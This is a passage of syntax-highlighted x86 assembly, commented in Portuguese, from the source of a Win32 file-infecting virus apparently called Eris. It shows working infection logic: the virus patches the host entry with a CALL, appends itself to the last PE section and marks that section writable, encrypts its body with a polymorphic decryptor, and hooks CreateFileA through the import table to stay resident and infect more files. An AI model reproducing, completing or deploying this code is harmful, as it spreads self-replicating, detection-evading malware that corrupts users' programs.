</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; AL = Instrução guardada...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; Salva !</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = Instrução do futuro hospedeiro...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">    </span><span class="sc1">; Salva no codigo</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">; AL = Instrução do futuro hospedeiro...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; Salva no codigo</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                        </span><span class="sc1">; Salva endereço para uso futuro...</span><span class="sc0">

</span><span class="sc1">;---- Calculo do salto entre o codigo do programa e o codigo do virus ----</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; EBX = EBX - EDX (distancia entre EP e inst.)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; EDI+= EBX (VA da inst.)</span><span class="sc0">
</span><span class="sc1">; EBX = Número de seções</span><span class="sc0">
</span><span class="sc6">movzx</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_FileHeader.FH_NumberOfSections</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0F8h</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EDX = Ponteiro para o cabeçalho de seções</span><span class="sc0">
</span><span class="sc6">imul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">        </span><span class="sc1">; EBX = BX * 28h</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; EDX = Ponteiro para o fim da ultima seção</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">28h</span><span class="sc0">         </span><span class="sc1">; EDX = Ponteiro para a ultima seção</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX = SizeOfRawData</span><span class="sc0">

</span><span class="sc1">; EAX = Image Base</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseaddr</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">; Salva no código para a proxima geração..</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">; EBX+= Image Base</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc1">; EBX+= VirtualAddress da seção</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; EDI+= Image Base = Endereço virtual da instrução</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Recupera endereço salvo !</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc2">5</span><span class="sc0">       </span><span class="sc1">; EDI = 5 (5 bytes da CALL)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">n_Area</span><span class="sc0">  </span><span class="sc1">; EBX+= Area encriptado = Area do inicio do decriptador poly.</span><span class="sc0">

</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">; EBX = Distancia entre os pontos (immed32)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">    </span><span class="sc1">; Poe immed32 no codigo do hospedeiro...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0E8h</span><span class="sc0"> </span><span class="sc1">; Poe instrução de CALL</span><span class="sc0">

</span><span class="sc1">;---- Infecção da ultima seção ----</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; SizeOfRawData</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                        </span><span class="sc1">; EDI = SizeOfRawData</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">n_Eris</span><span class="sc0">                         </span><span class="sc1">; EAX+= Tamanho do virus</span><span class="sc0">
</span><span class="sc1">; ECX = Fator de alinhamento</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                               </span><span class="sc1">; Salva EDX</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Alinha</span><span class="sc0">                            </span><span class="sc1">; Alinha...</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                                </span><span class="sc1">; Recupera EDX</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">edx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; EDI = Fim da ultima seção</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_SizeOfRawData</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Novo SizeOfRawData !!!</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_VirtualSize</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Novo VirtualSize !!!</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc5">bye</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edx.SH_Characteristics</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc4">],</span><span class="sc2">0C0h</span><span class="sc0"> </span><span class="sc1">; Seção R/W</span><span class="sc0">

</span><span class="sc1">;---- Copia para a ultima seção ----</span><span class="sc0">

</span><span class="sc6">pushad</span><span class="sc0">                           </span><span class="sc1">; Salva regs.</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX = VA da seção</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_ImageBase</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EAX = RVA</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Salva EAX !</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">edx.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc1">; EBX = Ponteiro (raw) para seção</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EBX = Ponteiro no nosso mapeamento</span><span class="sc0">

</span><span class="sc6">cld</span><span class="sc0">                              </span><span class="sc1">; D = 0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; EDI = Fim da ultima seção no nosso mapa</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Eris</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; ESI = Inicio do codigo</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_Area</span><span class="sc0">                   </span><span class="sc1">; ECX = Area que pode ser criptografada</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; Salva EDI !</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                        </span><span class="sc1">; Copia...</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                          </span><span class="sc1">; Recupera EDI !</span><span class="sc0">

</span><span class="sc1">;---- Encriptação complexa ----</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">rand</span><span class="sc0">                 </span><span class="sc1">; Pega numero randomico...</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k_tam</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; Salva tamanho no código</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                   </span><span class="sc1">; Recupera endereço virtual da area</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">k_buf</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0"> </span><span class="sc1">; Salva no codigo</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; Tamanho do buffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">           </span><span class="sc1">; Buffer</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Hash64</span><span class="sc0">        </span><span class="sc1">; Hashing...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">n_Area</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">; ECX = Tamanho da area a ser decriptada</span><span class="sc0">

</span><span class="sc5">enc_c</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">rcl</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">         </span><span class="sc1">; RCL EAX,CL</span><span class="sc0">
</span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">no_enc</span><span class="sc0">         </span><span class="sc1">; Bit = 0 ? Não encripta</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Encripta...</span><span class="sc0">
</span><span class="sc5">no_enc</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">        </span><span class="sc1">; XOR Chave, Modificador</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">enc_c</span><span class="sc0">         </span><span class="sc1">; Loop ;D</span><span class="sc0">

</span><span class="sc1">;---- Encriptação simples &amp; Polimorfismo ----</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">n_Area</span><span class="sc0">     </span><span class="sc1">; EAX = Local depois da area encriptada</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Crypt_Poly</span><span class="sc0">    </span><span class="sc1">; Faz o serviço sujo.. :P</span><span class="sc0">

</span><span class="sc6">popad</span><span class="sc0">              </span><span class="sc1">; Recupera regs.</span><span class="sc0">

</span><span class="sc1">; ---- Recupera dados da infecção atual ----</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">bl</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">host_org</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">; ---- Escreve / Libera memoria / Fecha arquivo / Recupera atributos ----</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edx.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_SizeOfImage</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EDI = W32_FIND_DATA</span><span class="sc0">
</span><span class="sc1">; ECX = File alignment</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">esi.IMAGE_NT_HEADERS.NT_OptionalHeader.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">edi.WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX = Tamanho do arquivo</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">n_Eris</span><span class="sc0">          </span><span class="sc1">; EAX+= Tamanho do virus</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Alinha</span><span class="sc0">         </span><span class="sc1">; Alinha com o arquivo</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FH</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EDI = FileHandle</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX = Ponteiro para memoria</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">             </span><span class="sc1">; ECX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; lpOverlapped</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@@</span><span class="sc0">                </span><span class="sc1">; lpNumberOfBytesWritten</span><span class="sc0">
</span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">@@@</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; nNumberOfBytesToWrite</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; lpBuffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; hFile</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">           </span><span class="sc1">; escreve...</span><span class="sc0">

</span><span class="sc5">libera_mem</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; EAX = 0</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Mem</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EBX = Ponteiro para memoria...</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">MEM_RELEASE</span><span class="sc0">    </span><span class="sc1">; FreeType</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">; Size</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">            </span><span class="sc1">; Address</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">VirtualFree</span><span class="sc0">     </span><span class="sc1">; Libera...</span><span class="sc0">

</span><span class="sc5">fecha_arq</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc0">                 </span><span class="sc1">; Fecha...</span><span class="sc0">

</span><span class="sc5">recupera_attr</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">busca</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EDI = Estrutua W32_FIND_DATA</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc5">edi.WFD_szFileName</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; EDI = Ponteiro para nome do arquivo</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                        </span><span class="sc1">; nome do arquivo</span><span class="sc0">
</span><span class="sc5">api</span><span class="sc0"> </span><span class="sc5">SetFileAttributesA</span><span class="sc0">          </span><span class="sc1">; Seta atributos...</span><span class="sc0">

</span><span class="sc5">infec_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc1">;--- Sub-função: Calcula alinhamento</span><span class="sc0">
</span><span class="sc1">; Entrada:</span><span class="sc0">
</span><span class="sc1">; EAX = Valor a ser alinhado</span><span class="sc0">
</span><span class="sc1">; ECX = Fator de alinhamento</span><span class="sc0">
</span><span class="sc1">; Saida:</span><span class="sc0">
</span><span class="sc1">; EAX = Valor alinhado</span><span class="sc0">
</span><span class="sc1">; EDX = O valor foi alterado ? (boolean)</span><span class="sc0">

</span><span class="sc5">Alinha</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; EDX = 0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">      </span><span class="sc1">; Salva EAX</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">       </span><span class="sc1">; Divide EAX por ECX</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Volta com EAX (o quociente não importa, somente o resto)</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">    </span><span class="sc1">; Resto = 0 ?</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">alinha_fim</span><span class="sc0"> </span><span class="sc1">; Então já está alinhado, sai fora...</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">   </span><span class="sc1">; ECX - EDX (fator de alinhamento - resto da divisão = complemento)</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">   </span><span class="sc1">; EAX + ECX (valor a ser alinhado + complemento)</span><span class="sc0">
</span><span class="sc5">alinha_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">           </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">Infecta</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;                   Per-Process Residency</span><span class="sc0">
</span><span class="sc1">; -----------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">PerProc</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0553B5C78h</span><span class="sc0">   </span><span class="sc1">; EAX = CRC32 de CreateFileA</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">PegaIAT</span><span class="sc0">         </span><span class="sc1">; Pega ponteiro na I.A.T.</span><span class="sc0">
</span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">perproc_fim</span><span class="sc0">       </span><span class="sc1">; Não achou ? Então vaza...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                    </span><span class="sc1">; EDI = Ponteiro para endereço da API, na IAT</span><span class="sc0">
</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">APIHooker</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; EAX = Ponteiro para interceptador da API</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">                          </span><span class="sc1">; Escreve...</span><span class="sc0">

</span><span class="sc5">perproc_fim</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">                  </span><span class="sc1">; Retorna...</span><span class="sc0">

</span><span class="sc5">PerProc</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">; --- Sub-função: Interceptador de chamadas da API CreateFileA</span><span class="sc0">

</span><span class="sc5">APIHooker</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                       </span><span class="sc1">; Aqui ficará o endereço da API</span><span class="sc0">
</span><span class="sc6">pushad</span><span class="sc0">                         </span><span class="sc1">; Salva regs...</span><span class="sc0">
</span><span class="sc6">pushfd</span><span class="sc0">                         </span><span class="sc1">; Salva flags...</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">Delta_Offset</span><span class="sc0">              </span><span class="sc1">; Pega Delta-Offset</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CreateFileA</span><span class="sc4">-</span><span class="sc5">delta</span><span class="sc4">]</span><span class="sc1">; EAX = Endereço da API</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">REGS_FLAGS</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Poe na stack...</span><span class="sc0">

</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">AlocaW32FD</span><span class="sc0">                </span><span class="sc1">; Aloca memória para Win32_Find_Data</span><span class="sc0">
</span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">hook_fim</span><span class="sc0">                 </span><span class="sc1">; ECX = 0 ? Então vaza...</span><span class="sc0">

</span><span class="sc1">; Acha final do nome...</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc5">REGS_FLAGS</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; EDI = FileName</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                    </span><span class="sc1">; EBX = EDI</span><span class="sc0">
